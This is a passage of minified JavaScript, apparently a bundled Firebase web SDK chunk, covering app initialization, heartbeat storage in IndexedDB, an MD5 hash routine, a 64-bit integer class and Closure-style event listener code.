kqe.values())cne(n,t);return!0}function Dqe(t,e){const n=t.container.getProvider("heartbeat").getImmediate({optional:!0});return n&&n.triggerHeartbeat(),t.container.getProvider(e)}function Bqe(t){return t==null?!1:t.settings!==void 0}const jqe={"no-app":"No Firebase App '{$appName}' has been created - call initializeApp() first","bad-app-name":"Illegal App name: '{$appName}'","duplicate-app":"Firebase App named '{$appName}' already exists with different options or config","app-deleted":"Firebase App named '{$appName}' already deleted","server-app-deleted":"Firebase Server App has been deleted","no-options":"Need to provide options, when not being deployed to hosting via source.","invalid-app-argument":"firebase.{$appName}() takes either no argument or a Firebase App instance.","invalid-log-argument":"First argument to `onLog` must be null or a function.","idb-open":"Error thrown when opening IndexedDB. Original error: {$originalErrorMessage}.","idb-get":"Error thrown when reading from IndexedDB. Original error: {$originalErrorMessage}.","idb-set":"Error thrown when writing to IndexedDB. Original error: {$originalErrorMessage}.","idb-delete":"Error thrown when deleting from IndexedDB. Original error: {$originalErrorMessage}.","finalization-registry-not-supported":"FirebaseServerApp deleteOnDeref field defined but the JS runtime does not support FinalizationRegistry.","invalid-server-app-environment":"FirebaseServerApp is not for use in browser environments."},_p=new Lde("app","Firebase",jqe);class Mqe{constructor(e,n,r){this._isDeleted=!1,this._options={...e},this._config={...n},this._name=n.name,this._automaticDataCollectionEnabled=n.automaticDataCollectionEnabled,this._container=r,this.container.addComponent(new D_("app",()=>this,"PUBLIC"))}get automaticDataCollectionEnabled(){return this.checkDestroyed(),this._automaticDataCollectionEnabled}set automaticDataCollectionEnabled(e){this.checkDestroyed(),this._automaticDataCollectionEnabled=e}get name(){return this.checkDestroyed(),this._name}get options(){return this.checkDestroyed(),this._options}get config(){return this.checkDestroyed(),this._config}get container(){return this._container}get isDeleted(){return this._isDeleted}set isDeleted(e){this._isDeleted=e}checkDestroyed(){if(this.isDeleted)throw _p.create("app-deleted",{appName:this._name})}}const Uqe=Nqe;function zde(t,e={}){let n=t;typeof e!="object"&&(e={name:e});const r={name:PD,automaticDataCollectionEnabled:!0,...e},i=r.name;if(typeof i!="string"||!i)throw _p.create("bad-app-name",{appName:String(i)});if(n||(n=Ude()),!n)throw _p.create("no-options");const s=EI.get(i);if(s){if(vI(n,s.options)&&vI(r,s.config))return s;throw _p.create("duplicate-app",{appName:i})}const o=new $ze(i);for(const c of ND.values())o.addComponent(c);const a=new Mqe(n,r,o);return EI.set(i,a),a}function Lqe(t=PD){const e=EI.get(t);if(!e&&t===PD&&Ude())return zde();if(!e)throw _p.create("no-app",{appName:t});return e}function h1(t,e,n){let r=Oqe[t]??t;n&&(r+=`-${n}`);const i=r.match(/\s|\//),s=e.match(/\s|\//);if(i||s){const o=[`Unable to register library "${r}" with version "${e}":`];i&&o.push(`library name "${r}" contains illegal characters (whitespace or "/")`),i&&s&&o.push("and"),s&&o.push(`version name "${e}" contains illegal characters (whitespace or "/")`),Hf.warn(o.join(" "));return}_I(new D_(`${r}-version`,()=>({library:r,version:e}),"VERSION"))}const Fqe="firebase-heartbeat-database",$qe=1,B_="firebase-heartbeat-store";let wk=null;function qde(){return wk||(wk=eqe(Fqe,$qe,{upgrade:(t,e)=>{switch(e){case 0:try{t.createObjectStore(B_)}catch(n){console.warn(n)}}}}).catch(t=>{throw _p.create("idb-open",{originalErrorMessage:t.message})})),wk}async function Hqe(t){try{const n=(await qde()).transaction(B_),r=await n.objectStore(B_).get(Vde(t));return await n.done,r}catch(e){if(e instanceof Ew)Hf.warn(e.message);else{const n=_p.create("idb-get",{originalErrorMessage:e?.message});Hf.warn(n.message)}}}async function une(t,e){try{const r=(await qde()).transaction(B_,"readwrite");await r.objectStore(B_).put(e,Vde(t)),await r.done}catch(n){if(n instanceof Ew)Hf.warn(n.message);else{const r=_p.create("idb-set",{originalErrorMessage:n?.message});Hf.warn(r.message)}}}function Vde(t){return`${t.name}!${t.options.appId}`}const zqe=1024,qqe=30;class Vqe{constructor(e){this.container=e,this._heartbeatsCache=null;const n=this.container.getProvider("app").getImmediate();this._storage=new Gqe(n),this._heartbeatsCachePromise=this._storage.read().then(r=>(this._heartbeatsCache=r,r))}async triggerHeartbeat(){try{const n=this.container.getProvider("platform-logger").getImmediate().getPlatformInfoString(),r=lne();if(this._heartbeatsCache?.heartbeats==null&&(this._heartbeatsCache=await this._heartbeatsCachePromise,this._heartbeatsCache?.heartbeats==null)||this._heartbeatsCache.lastSentHeartbeatDate===r||this._heartbeatsCache.heartbeats.some(i=>i.date===r))return;if(this._heartbeatsCache.heartbeats.push({date:r,agent:n}),this._heartbeatsCache.heartbeats.length>qqe){const i=Kqe(this._heartbeatsCache.heartbeats);this._heartbeatsCache.heartbeats.splice(i,1)}return this._storage.overwrite(this._heartbeatsCache)}catch(e){Hf.warn(e)}}async getHeartbeatsHeader(){try{if(this._heartbeatsCache===null&&await this._heartbeatsCachePromise,this._heartbeatsCache?.heartbeats==null||this._heartbeatsCache.heartbeats.length===0)return"";const e=lne(),{heartbeatsToSend:n,unsentEntries:r}=Wqe(this._heartbeatsCache.heartbeats),i=wI(JSON.stringify({version:2,heartbeats:n}));return this._heartbeatsCache.lastSentHeartbeatDate=e,r.length>0?(this._heartbeatsCache.heartbeats=r,await this._storage.overwrite(this._heartbeatsCache)):(this._heartbeatsCache.heartbeats=[],this._storage.overwrite(this._heartbeatsCache)),i}catch(e){return Hf.warn(e),""}}}function lne(){return new Date().toISOString().substring(0,10)}function Wqe(t,e=zqe){const n=[];let r=t.slice();for(const i of t){const s=n.find(o=>o.agent===i.agent);if(s){if(s.dates.push(i.date),dne(n)>e){s.dates.pop();break}}else if(n.push({agent:i.agent,dates:[i.date]}),dne(n)>e){n.pop();break}r=r.slice(1)}return{heartbeatsToSend:n,unsentEntries:r}}class Gqe{constructor(e){this.app=e,this._canUseIndexedDBPromise=this.runIndexedDBEnvironmentCheck()}async runIndexedDBEnvironmentCheck(){return kze()?Dze().then(()=>!0).catch(()=>!1):!1}async read(){if(await this._canUseIndexedDBPromise){const n=await Hqe(this.app);return n?.heartbeats?n:{heartbeats:[]}}else return{heartbeats:[]}}async overwrite(e){if(await this._canUseIndexedDBPromise){const r=await this.read();return une(this.app,{lastSentHeartbeatDate:e.lastSentHeartbeatDate??r.lastSentHeartbeatDate,heartbeats:e.heartbeats})}else return}async add(e){if(await this._canUseIndexedDBPromise){const r=await this.read();return une(this.app,{lastSentHeartbeatDate:e.lastSentHeartbeatDate??r.lastSentHeartbeatDate,heartbeats:[...r.heartbeats,...e.heartbeats]})}else return}}function dne(t){return wI(JSON.stringify({version:2,heartbeats:t})).length}function Kqe(t){if(t.length===0)return-1;let e=0,n=t[0].date;for(let r=1;r<t.length;r++)t[r].date<n&&(n=t[r].date,e=r);return e}function Zqe(t){_I(new D_("platform-logger",e=>new rqe(e),"PRIVATE")),_I(new D_("heartbeat",e=>new Vqe(e),"PRIVATE")),h1(RD,ane,t),h1(RD,ane,"esm2020"),h1("fire-js","")}Zqe("");var fne=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};var Ap,Wde;(function(){var t;function e(_,I){function T(){}T.prototype=I.prototype,_.F=I.prototype,_.prototype=new T,_.prototype.constructor=_,_.D=function(B,U,M){for(var N=Array(arguments.length-2),q=2;q<arguments.length;q++)N[q-2]=arguments[q];return I.prototype[U].apply(B,N)}}function n(){this.blockSize=-1}function r(){this.blockSize=-1,this.blockSize=64,this.g=Array(4),this.C=Array(this.blockSize),this.o=this.h=0,this.u()}e(r,n),r.prototype.u=function(){this.g[0]=1732584193,this.g[1]=4023233417,this.g[2]=2562383102,this.g[3]=271733878,this.o=this.h=0};function i(_,I,T){T||(T=0);const B=Array(16);if(typeof I=="string")for(var U=0;U<16;++U)B[U]=I.charCodeAt(T++)|I.charCodeAt(T++)<<8|I.charCodeAt(T++)<<16|I.charCodeAt(T++)<<24;else for(U=0;U<16;++U)B[U]=I[T++]|I[T++]<<8|I[T++]<<16|I[T++]<<24;I=_.g[0],T=_.g[1],U=_.g[2];let M=_.g[3],N;N=I+(M^T&(U^M))+B[0]+3614090360&4294967295,I=T+(N<<7&4294967295|N>>>25),N=M+(U^I&(T^U))+B[1]+3905402710&4294967295,M=I+(N<<12&4294967295|N>>>20),N=U+(T^M&(I^T))+B[2]+606105819&4294967295,U=M+(N<<17&4294967295|N>>>15),N=T+(I^U&(M^I))+B[3]+3250441966&4294967295,T=U+(N<<22&4294967295|N>>>10),N=I+(M^T&(U^M))+B[4]+4118548399&4294967295,I=T+(N<<7&4294967295|N>>>25),N=M+(U^I&(T^U))+B[5]+1200080426&4294967295,M=I+(N<<12&4294967295|N>>>20),N=U+(T^M&(I^T))+B[6]+2821735955&4294967295,U=M+(N<<17&4294967295|N>>>15),N=T+(I^U&(M^I))+B[7]+4249261313&4294967295,T=U+(N<<22&4294967295|N>>>10),N=I+(M^T&(U^M))+B[8]+1770035416&4294967295,I=T+(N<<7&4294967295|N>>>25),N=M+(U^I&(T^U))+B[9]+2336552879&4294967295,M=I+(N<<12&4294967295|N>>>20),N=U+(T^M&(I^T))+B[10]+4294925233&4294967295,U=M+(N<<17&4294967295|N>>>15),N=T+(I^U&(M^I))+B[11]+2304563134&4294967295,T=U+(N<<22&4294967295|N>>>10),N=I+(M^T&(U^M))+B[12]+1804603682&4294967295,I=T+(N<<7&4294967295|N>>>25),N=M+(U^I&(T^U))+B[13]+4254626195&4294967295,M=I+(N<<12&4294967295|N>>>20),N=U+(T^M&(I^T))+B[14]+2792965006&4294967295,U=M+(N<<17&4294967295|N>>>15),N=T+(I^U&(M^I))+B[15]+1236535329&4294967295,T=U+(N<<22&4294967295|N>>>10),N=I+(U^M&(T^U))+B[1]+4129170786&4294967295,I=T+(N<<5&4294967295|N>>>27),N=M+(T^U&(I^T))+B[6]+3225465664&4294967295,M=I+(N<<9&4294967295|N>>>23),N=U+(I^T&(M^I))+B[11]+643717713&4294967295,U=M+(N<<14&4294967295|N>>>18),N=T+(M^I&(U^M))+B[0]+3921069994&4294967295,T=U+(N<<20&4294967295|N>>>12),N=I+(U^M&(T^U))+B[5]+3593408605&4294967295,I=T+(N<<5&4294967295|N>>>27),N=M+(T^U&(I^T))+B[10]+38016083&4294967295,M=I+(N<<9&4294967295|N>>>23),N=U+(I^T&(M^I))+B[15]+3634488961&4294967295,U=M+(N<<14&4294967295|N>>>18),N=T+(M^I&(U^M))+B[4]+3889429448&4294967295,T=U+(N<<20&4294967295|N>>>12),N=I+(U^M&(T^U))+B[9]+568446438&4294967295,I=T+(N<<5&4294967295|N>>>27),N=M+(T^U&(I^T))+B[14]+3275163606&4294967295,M=I+(N<<9&4294967295|N>>>23),N=U+(I^T&(M^I))+B[3]+4107603335&4294967295,U=M+(N<<14&4294967295|N>>>18),N=T+(M^I&(U^M))+B[8]+1163531501&4294967295,T=U+(N<<20&4294967295|N>>>12),N=I+(U^M&(T^U))+B[13]+2850285829&4294967295,I=T+(N<<5&4294967295|N>>>27),N=M+(T^U&(I^T))+B[2]+4243563512&4294967295,M=I+(N<<9&4294967295|N>>>23),N=U+(I^T&(M^I))+B[7]+1735328473&4294967295,U=M+(N<<14&4294967295|N>>>18),N=T+(M^I&(U^M))+B[12]+2368359562&4294967295,T=U+(N<<20&4294967295|N>>>12),N=I+(T^U^M)+B[5]+4294588738&4294967295,I=T+(N<<4&4294967295|N>>>28),N=M+(I^T^U)+B[8]+2272392833&4294967295,M=I+(N<<11&4294967295|N>>>21),N=U+(M^I^T)+B[11]+1839030562&4294967295,U=M+(N<<16&4294967295|N>>>16),N=T+(U^M^I)+B[14]+4259657740&4294967295,T=U+(N<<23&4294967295|N>>>9),N=I+(T^U^M)+B[1]+2763975236&4294967295,I=T+(N<<4&4294967295|N>>>28),N=M+(I^T^U)+B[4]+1272893353&4294967295,M=I+(N<<11&4294967295|N>>>21),N=U+(M^I^T)+B[7]+4139469664&4294967295,U=M+(N<<16&4294967295|N>>>16),N=T+(U^M^I)+B[10]+3200236656&4294967295,T=U+(N<<23&4294967295|N>>>9),N=I+(T^U^M)+B[13]+681279174&4294967295,I=T+(N<<4&4294967295|N>>>28),N=M+(I^T^U)+B[0]+3936430074&4294967295,M=I+(N<<11&4294967295|N>>>21),N=U+(M^I^T)+B[3]+3572445317&4294967295,U=M+(N<<16&4294967295|N>>>16),N=T+(U^M^I)+B[6]+76029189&4294967295,T=U+(N<<23&4294967295|N>>>9),N=I+(T^U^M)+B[9]+3654602809&4294967295,I=T+(N<<4&4294967295|N>>>28),N=M+(I^T^U)+B[12]+3873151461&4294967295,M=I+(N<<11&4294967295|N>>>21),N=U+(M^I^T)+B[15]+530742520&4294967295,U=M+(N<<16&4294967295|N>>>16),N=T+(U^M^I)+B[2]+3299628645&4294967295,T=U+(N<<23&4294967295|N>>>9),N=I+(U^(T|~M))+B[0]+4096336452&4294967295,I=T+(N<<6&4294967295|N>>>26),N=M+(T^(I|~U))+B[7]+1126891415&4294967295,M=I+(N<<10&4294967295|N>>>22),N=U+(I^(M|~T))+B[14]+2878612391&4294967295,U=M+(N<<15&4294967295|N>>>17),N=T+(M^(U|~I))+B[5]+4237533241&4294967295,T=U+(N<<21&4294967295|N>>>11),N=I+(U^(T|~M))+B[12]+1700485571&4294967295,I=T+(N<<6&4294967295|N>>>26),N=M+(T^(I|~U))+B[3]+2399980690&4294967295,M=I+(N<<10&4294967295|N>>>22),N=U+(I^(M|~T))+B[10]+4293915773&4294967295,U=M+(N<<15&4294967295|N>>>17),N=T+(M^(U|~I))+B[1]+2240044497&4294967295,T=U+(N<<21&4294967295|N>>>11),N=I+(U^(T|~M))+B[8]+1873313359&4294967295,I=T+(N<<6&4294967295|N>>>26),N=M+(T^(I|~U))+B[15]+4264355552&4294967295,M=I+(N<<10&4294967295|N>>>22),N=U+(I^(M|~T))+B[6]+2734768916&4294967295,U=M+(N<<15&4294967295|N>>>17),N=T+(M^(U|~I))+B[13]+1309151649&4294967295,T=U+(N<<21&4294967295|N>>>11),N=I+(U^(T|~M))+B[4]+4149444226&4294967295,I=T+(N<<6&4294967295|N>>>26),N=M+(T^(I|~U))+B[11]+3174756917&4294967295,M=I+(N<<10&4294967295|N>>>22),N=U+(I^(M|~T))+B[2]+718787259&4294967295,U=M+(N<<15&4294967295|N>>>17),N=T+(M^(U|~I))+B[9]+3951481745&4294967295,_.g[0]=_.g[0]+I&4294967295,_.g[1]=_.g[1]+(U+(N<<21&4294967295|N>>>11))&4294967295,_.g[2]=_.g[2]+U&4294967295,_.g[3]=_.g[3]+M&4294967295}r.prototype.v=function(_,I){I===void 0&&(I=_.length);const T=I-this.blockSize,B=this.C;let U=this.h,M=0;for(;M<I;){if(U==0)for(;M<=T;)i(this,_,M),M+=this.blockSize;if(typeof _=="string"){for(;M<I;)if(B[U++]=_.charCodeAt(M++),U==this.blockSize){i(this,B),U=0;break}}else for(;M<I;)if(B[U++]=_[M++],U==this.blockSize){i(this,B),U=0;break}}this.h=U,this.o+=I},r.prototype.A=function(){var _=Array((this.h<56?this.blockSize:this.blockSize*2)-this.h);_[0]=128;for(var I=1;I<_.length-8;++I)_[I]=0;I=this.o*8;for(var T=_.length-8;T<_.length;++T)_[T]=I&255,I/=256;for(this.v(_),_=Array(16),I=0,T=0;T<4;++T)for(let B=0;B<32;B+=8)_[I++]=this.g[T]>>>B&255;return _};function s(_,I){var T=a;return Object.prototype.hasOwnProperty.call(T,_)?T[_]:T[_]=I(_)}function o(_,I){this.h=I;const T=[];let B=!0;for(let U=_.length-1;U>=0;U--){const M=_[U]|0;B&&M==I||(T[U]=M,B=!1)}this.g=T}var a={};function c(_){return-128<=_&&_<128?s(_,function(I){return new o([I|0],I<0?-1:0)}):new o([_|0],_<0?-1:0)}function l(_){if(isNaN(_)||!isFinite(_))return h;if(_<0)return E(l(-_));const I=[];let T=1;for(let B=0;_>=T;B++)I[B]=_/T|0,T*=4294967296;return new o(I,0)}function f(_,I){if(_.length==0)throw Error("number format error: empty string");if(I=I||10,I<2||36<I)throw Error("radix out of range: "+I);if(_.charAt(0)=="-")return E(f(_.substring(1),I));if(_.indexOf("-")>=0)throw Error('number format error: interior "-" character');const T=l(Math.pow(I,8));let B=h;for(let M=0;M<_.length;M+=8){var U=Math.min(8,_.length-M);const N=parseInt(_.substring(M,M+U),I);U<8?(U=l(Math.pow(I,U)),B=B.j(U).add(l(N))):(B=B.j(T),B=B.add(l(N)))}return B}var h=c(0),m=c(1),b=c(16777216);t=o.prototype,t.m=function(){if(y(this))return-E(this).m();let _=0,I=1;for(let T=0;T<this.g.length;T++){const B=this.i(T);_+=(B>=0?B:4294967296+B)*I,I*=4294967296}return _},t.toString=function(_){if(_=_||10,_<2||36<_)throw Error("radix out of range: "+_);if(w(this))return"0";if(y(this))return"-"+E(this).toString(_);const I=l(Math.pow(_,6));var T=this;let B="";for(;;){const U=v(T,I).g;T=A(T,U.j(I));let M=((T.g.length>0?T.g[0]:T.h)>>>0).toString(_);if(T=U,w(T))return M+B;for(;M.length<6;)M="0"+M;B=M+B}},t.i=function(_){return _<0?0:_<this.g.length?this.g[_]:this.h};function w(_){if(_.h!=0)return!1;for(let I=0;I<_.g.length;I++)if(_.g[I]!=0)return!1;return!0}function y(_){return _.h==-1}t.l=function(_){return _=A(this,_),y(_)?-1:w(_)?0:1};function E(_){const I=_.g.length,T=[];for(let B=0;B<I;B++)T[B]=~_.g[B];return new o(T,~_.h).add(m)}t.abs=function(){return y(this)?E(this):this},t.add=function(_){const I=Math.max(this.g.length,_.g.length),T=[];let B=0;for(let U=0;U<=I;U++){let M=B+(this.i(U)&65535)+(_.i(U)&65535),N=(M>>>16)+(this.i(U)>>>16)+(_.i(U)>>>16);B=N>>>16,M&=65535,N&=65535,T[U]=N<<16|M}return new o(T,T[T.length-1]&-2147483648?-1:0)};function A(_,I){return _.add(E(I))}t.j=function(_){if(w(this)||w(_))return h;if(y(this))return y(_)?E(this).j(E(_)):E(E(this).j(_));if(y(_))return E(this.j(E(_)));if(this.l(b)<0&&_.l(b)<0)return l(this.m()*_.m());const I=this.g.length+_.g.length,T=[];for(var B=0;B<2*I;B++)T[B]=0;for(B=0;B<this.g.length;B++)for(let U=0;U<_.g.length;U++){const M=this.i(B)>>>16,N=this.i(B)&65535,q=_.i(U)>>>16,P=_.i(U)&65535;T[2*B+2*U]+=N*P,R(T,2*B+2*U),T[2*B+2*U+1]+=M*P,R(T,2*B+2*U+1),T[2*B+2*U+1]+=N*q,R(T,2*B+2*U+1),T[2*B+2*U+2]+=M*q,R(T,2*B+2*U+2)}for(_=0;_<I;_++)T[_]=T[2*_+1]<<16|T[2*_];for(_=I;_<2*I;_++)T[_]=0;return new o(T,0)};function R(_,I){for(;(_[I]&65535)!=_[I];)_[I+1]+=_[I]>>>16,_[I]&=65535,I++}function S(_,I){this.g=_,this.h=I}function v(_,I){if(w(I))throw Error("division by zero");if(w(_))return new S(h,h);if(y(_))return I=v(E(_),I),new S(E(I.g),E(I.h));if(y(I))return I=v(_,E(I)),new S(E(I.g),I.h);if(_.g.length>30){if(y(_)||y(I))throw Error("slowDivide_ only works with positive integers.");for(var T=m,B=I;B.l(_)<=0;)T=k(T),B=k(B);var U=O(T,1),M=O(B,1);for(B=O(B,2),T=O(T,2);!w(B);){var N=M.add(B);N.l(_)<=0&&(U=U.add(T),M=N),B=O(B,1),T=O(T,1)}return I=A(_,U.j(I)),new S(U,I)}for(U=h;_.l(I)>=0;){for(T=Math.max(1,Math.floor(_.m()/I.m())),B=Math.ceil(Math.log(T)/Math.LN2),B=B<=48?1:Math.pow(2,B-48),M=l(T),N=M.j(I);y(N)||N.l(_)>0;)T-=B,M=l(T),N=M.j(I);w(M)&&(M=m),U=U.add(M),_=A(_,N)}return new S(U,_)}t.B=function(_){return v(this,_).h},t.and=function(_){const I=Math.max(this.g.length,_.g.length),T=[];for(let B=0;B<I;B++)T[B]=this.i(B)&_.i(B);return new o(T,this.h&_.h)},t.or=function(_){const I=Math.max(this.g.length,_.g.length),T=[];for(let B=0;B<I;B++)T[B]=this.i(B)|_.i(B);return new o(T,this.h|_.h)},t.xor=function(_){const I=Math.max(this.g.length,_.g.length),T=[];for(let B=0;B<I;B++)T[B]=this.i(B)^_.i(B);return new o(T,this.h^_.h)};function k(_){const I=_.g.length+1,T=[];for(let B=0;B<I;B++)T[B]=_.i(B)<<1|_.i(B-1)>>>31;return new o(T,_.h)}function O(_,I){const T=I>>5;I%=32;const B=_.g.length-T,U=[];for(let M=0;M<B;M++)U[M]=I>0?_.i(M+T)>>>I|_.i(M+T+1)<<32-I:_.i(M+T);return new o(U,_.h)}r.prototype.digest=r.prototype.A,r.prototype.reset=r.prototype.u,r.prototype.update=r.prototype.v,Wde=r,o.prototype.add=o.prototype.add,o.prototype.multiply=o.prototype.j,o.prototype.modulo=o.prototype.B,o.prototype.compare=o.prototype.l,o.prototype.toNumber=o.prototype.m,o.prototype.toString=o.prototype.toString,o.prototype.getBits=o.prototype.i,o.fromNumber=l,o.fromString=f,Ap=o}).apply(typeof fne<"u"?fne:typeof self<"u"?self:typeof window<"u"?window:{});var RT=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};var Gde,J2,Kde,ex,OD,Zde,Yde,Qde;(function(){var t,e=Object.defineProperty;function n(x){x=[typeof globalThis=="object"&&globalThis,x,typeof window=="object"&&window,typeof self=="object"&&self,typeof RT=="object"&&RT];for(var W=0;W<x.length;++W){var Q=x[W];if(Q&&Q.Math==Math)return Q}throw Error("Cannot find global object")}var r=n(this);function i(x,W){if(W)e:{var Q=r;x=x.split(".");for(var se=0;se<x.length-1;se++){var ve=x[se];if(!(ve in Q))break e;Q=Q[ve]}x=x[x.length-1],se=Q[x],W=W(se),W!=se&&W!=null&&e(Q,x,{configurable:!0,writable:!0,value:W})}}i("Symbol.dispose",function(x){return x||Symbol("Symbol.dispose")}),i("Array.prototype.values",function(x){return x||function(){return this[Symbol.iterator]()}}),i("Object.entries",function(x){return x||function(W){var Q=[],se;for(se in W)Object.prototype.hasOwnProperty.call(W,se)&&Q.push([se,W[se]]);return Q}});var s=s||{},o=this||self;function a(x){var W=typeof x;return W=="object"&&x!=null||W=="function"}function c(x,W,Q){return x.call.apply(x.bind,arguments)}function l(x,W,Q){return l=c,l.apply(null,arguments)}function f(x,W){var Q=Array.prototype.slice.call(arguments,1);return function(){var se=Q.slice();return se.push.apply(se,arguments),x.apply(this,se)}}function h(x,W){function Q(){}Q.prototype=W.prototype,x.Z=W.prototype,x.prototype=new Q,x.prototype.constructor=x,x.Ob=function(se,ve,Ie){for(var Je=Array(arguments.length-2),Zt=2;Zt<arguments.length;Zt++)Je[Zt-2]=arguments[Zt];return W.prototype[ve].apply(se,Je)}}var m=typeof AsyncContext<"u"&&typeof AsyncContext.Snapshot=="function"?x=>x&&AsyncContext.Snapshot.wrap(x):x=>x;function b(x){const W=x.length;if(W>0){const Q=Array(W);for(let se=0;se<W;se++)Q[se]=x[se];return Q}return[]}function w(x,W){for(let se=1;se<arguments.length;se++){const ve=arguments[se];var Q=typeof ve;if(Q=Q!="object"?Q:ve?Array.isArray(ve)?"array":Q:"null",Q=="array"||Q=="object"&&typeof ve.length=="number"){Q=x.length||0;const Ie=ve.length||0;x.length=Q+Ie;for(let Je=0;Je<Ie;Je++)x[Q+Je]=ve[Je]}else x.push(ve)}}class y{constructor(W,Q){this.i=W,this.j=Q,this.h=0,this.g=null}get(){let W;return this.h>0?(this.h--,W=this.g,this.g=W.next,W.next=null):W=this.i(),W}}function E(x){o.setTimeout(()=>{throw x},0)}function A(){var x=_;let W=null;return x.g&&(W=x.g,x.g=x.g.next,x.g||(x.h=null),W.next=null),W}class R{constructor(){this.h=this.g=null}add(W,Q){const se=S.get();se.set(W,Q),this.h?this.h.next=se:this.g=se,this.h=se}}var S=new y(()=>new v,x=>x.reset());class v{constructor(){this.next=this.g=this.h=null}set(W,Q){this.h=W,this.g=Q,this.next=null}reset(){this.next=this.g=this.h=null}}let k,O=!1,_=new R,I=()=>{const x=Promise.resolve(void 0);k=()=>{x.then(T)}};function T(){for(var x;x=A();){try{x.h.call(x.g)}catch(Q){E(Q)}var W=S;W.j(x),W.h<100&&(W.h++,x.next=W.g,W.g=x)}O=!1}function B(){this.u=this.u,this.C=this.C}B.prototype.u=!1,B.prototype.dispose=function(){this.u||(this.u=!0,this.N())},B.prototype[Symbol.dispose]=function(){this.dispose()},B.prototype.N=function(){if(this.C)for(;this.C.length;)this.C.shift()()};function U(x,W){this.type=x,this.g=this.target=W,this.defaultPrevented=!1}U.prototype.h=function(){this.defaultPrevented=!0};var M=(function(){if(!o.addEventListener||!Object.defineProperty)return!1;var x=!1,W=Object.defineProperty({},"passive",{get:function(){x=!0}});try{const Q=()=>{};o.addEventListener("test",Q,W),o.removeEventListener("test",Q,W)}catch{}return x})();function N(x){return/^[\s\xa0]*$/.test(x)}function q(x,W){U.call(this,x?x.type:""),this.relatedTarget=this.g=this.target=null,this.button=this.screenY=this.screenX=this.clientY=this.clientX=0,this.key="",this.metaKey=this.shiftKey=this.altKey=this.ctrlKey=!1,this.state=null,this.pointerId=0,this.pointerType="",this.i=null,x&&this.init(x,W)}h(q,U),q.prototype.init=function(x,W){const Q=this.type=x.type,se=x.changedTouches&&x.changedTouches.length?x.changedTouches[0]:null;this.target=x.target||x.srcElement,this.g=W,W=x.relatedTarget,W||(Q=="mouseover"?W=x.fromElement:Q=="mouseout"&&(W=x.toElement)),this.relatedTarget=W,se?(this.clientX=se.clientX!==void 0?se.clientX:se.pageX,this.clientY=se.clientY!==void 0?se.clientY:se.pageY,this.screenX=se.screenX||0,this.screenY=se.screenY||0):(this.clientX=x.clientX!==void 0?x.clientX:x.pageX,this.clientY=x.clientY!==void 0?x.clientY:x.pageY,this.screenX=x.screenX||0,this.screenY=x.screenY||0),this.button=x.button,this.key=x.key||"",this.ctrlKey=x.ctrlKey,this.altKey=x.altKey,this.shiftKey=x.shiftKey,this.metaKey=x.metaKey,this.pointerId=x.pointerId||0,this.pointerType=x.pointerType,this.state=x.state,this.i=x,x.defaultPrevented&&q.Z.h.call(this)},q.prototype.h=function(){q.Z.h.call(this);const x=this.i;x.preventDefault?x.preventDefault():x.returnValue=!1};var P="closure_listenable_"+(Math.random()*1e6|0),C=0;function j(x,W,Q,se,ve){this.listener=x,this.proxy=null,this.src=W,this.type=Q,this.capture=!!se,this.ha=ve,this.key=++C,this.da=this.fa=!1}function z(x){x.da=!0,x.listener=null,x.proxy=null,x.src=null,x.ha=null}function $(x,W,Q){for(const se in x)W.call(Q,x[se],se,x)}function H(x,W){for(const Q in x)W.call(void 0,x[Q],Q,x)}function L(x){const W={};for(const Q in x)W[Q]=x[Q];return W}const V="constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(" ");function G(x,W){let Q,se;for(let ve=1;ve<arguments.length;ve++){se=arguments[ve];for(Q in se)x[Q]=se[Q];for(let Ie=0;Ie<V.length;Ie++)Q=V[Ie],Object.prototype.hasOwnProperty.call(se,Q)&&(x[Q]=se[Q])}}function Z(x){this.src=x,this.g={},this.h=0}Z.prototype.add=function(x,W,Q,se,ve){const Ie=x.toString();x=this.g[Ie],x||(x=this.g[Ie]=[],this.h++);const Je=ne(x,W,se,ve);return Je>-1?(W=x[Je],Q||(W.fa=!1)):(W=new j(W,this.src,Ie,!!se,ve),W.fa=Q,x.push(W)),W};function J(x,W){const Q=W.type;if(Q in x.g){var se=x.g[Q],ve=Array.prototype.indexOf.call(se,W,void 0),Ie;(Ie=ve>=0)&&Array.prototype.splice.call(se,ve,1),Ie&&(z(W),x.g[Q].length==0&&(delete x.g[Q],x.h--))}}function ne(x,W,Q,se){for(let ve=0;ve<x.length;++ve){const Ie=x[ve];if(!Ie.da&&Ie.listener==W&&Ie.capture==!!Q&&Ie.ha==se)return ve}return-1}var re="closure_lm_"+(Math.random()*1e6|0),le={};function oe(x,W,Q,se,ve){if(Array.isArray(W)){for(let Ie=0;Ie<W.length;Ie++)oe(x,W[Ie],Q,se,ve);return null}return Q=At(Q),x&&x[P]?x.J(W,Q,a(se)?!!se.capture:!1,ve):ue(x,W,Q,!1,se,ve)}function ue(x,W,Q,se,ve,Ie){if(!W)throw Error("Invalid event type");const Je=a(ve)?!!ve.capture:!!ve;let Zt=it(x);if(Zt||(x[re]=Zt=new Z(x)),Q=Zt.add(W,Q,se,Je,Ie),Q.proxy)return Q;if(se=be(),Q.proxy=se,se.src=x,se.listener=Q,x.addEventListener)M||(ve=Je),ve===void 0&&(ve=!1),x.addEventListener(W.toString(),se,ve);else if(x.attachEvent)x.attachEvent(Oe(W.toString()),se);else if(x.addListener&&x.removeListener)x.addListener(se);else throw Error("addEventListener and attachEvent are unavailable.");return Q}function be(){function x(Q){return W.call(x.src,x.listener,Q)}const W=Ke;return x}function Me(x,W,Q,se,ve){if(Array.isArray(W))for(var Ie=0;Ie<W.length;Ie++)Me(x,W[Ie],Q,se,ve);else se=a(se)?!!se.capture:!!se,Q=At(Q),x&&x[P]?(x=x.i,Ie=String(W).toString(),Ie in x.g&&(W=x.g[Ie],Q=ne(W,Q,se,ve),Q>-1&&(z(W[Q]),Array.prototype.splice.call(W,Q,1),W.length==0&&(delete x.g[Ie],x.h--)))):x&&(x=it(x))&&(W=x.g[W.toString()],x=-1,W&&(x=ne(W,Q,se,ve)),(Q=x>-1?W[x]:null)&&Te(Q))}function Te(x){if(typeof x!="number"&&x&&!x.da){var W=x.src;if(W&&W[P])J(W.i,x);else{var 